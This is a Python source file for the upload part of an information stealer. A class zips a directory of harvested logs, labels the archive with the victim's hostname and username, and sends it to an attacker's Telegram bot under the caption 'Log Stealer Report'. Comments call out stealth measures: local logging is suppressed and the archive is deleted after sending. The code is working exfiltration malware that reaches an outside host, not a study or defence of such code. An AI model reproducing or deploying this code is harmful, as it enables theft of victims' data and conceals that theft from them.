import os
import shutil
import requests
import logging
import socket
from datetime import datetime

class TelegramUploader:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        # Placeholder credentials - User must update these!
        self.bot_token = "YOUR-TOKEN"
        self.chat_id = "YOUR-CHAT-ID"
        self.api_url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"

    def zip_output(self):
        try:
            pc_name = socket.gethostname()
            date_str = datetime.now().strftime("%d-%m-%y_%H-%M")
            zip_filename = f"LogFrom_{pc_name}_{date_str}" 
            
            # Create zip file in the parent directory of output to avoid zipping the zip itself if repeated
            base_dir = os.path.dirname(self.output_dir)
            zip_path = os.path.join(base_dir, zip_filename)
            
            shutil.make_archive(zip_path, 'zip', self.output_dir)
            return zip_path + ".zip"
        except Exception as e:
            logging.error(f"Failed to zip output: {e}")
            return None

    def upload(self):
        # We don't verify token here to avoid printing it or logging it excessively
        zip_file = self.zip_output()
        if not zip_file:
            return

        try:
            # logging.info(f"Uploading {os.path.basename(zip_file)} to Telegram...") 
            # Stealth: Don't log this to the file that stays on the PC!
            print(f"[*] Uploading {os.path.basename(zip_file)}...")
            
            with open(zip_file, 'rb') as f:
                files = {'document': f}
                caption = f"Log Stealer Report\nPC: {socket.gethostname()}\nUser: {os.getlogin()}"
                data = {'chat_id': self.chat_id, 'caption': caption}
                
                response = requests.post(self.api_url, files=files, data=data)
                
            if response.status_code == 200:
                print("[+] Upload successful!")
            else:
                print(f"[-] Upload failed: {response.text}")
                
        except Exception as e:
            print(f"[-] DB Upload error: {e}")
        finally:
            # Cleanup zip file after upload - Stealth Mode
            try:
                if os.path.exists(zip_file):
                    os.remove(zip_file)
            except:
                pass

if __name__ == "__main__":
    # Test
    logging.basicConfig(level=logging.INFO)
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    OUTPUT_DIR = os.path.join(BASE_DIR, "output")
    uploader = TelegramUploader(OUTPUT_DIR)
    uploader.upload()
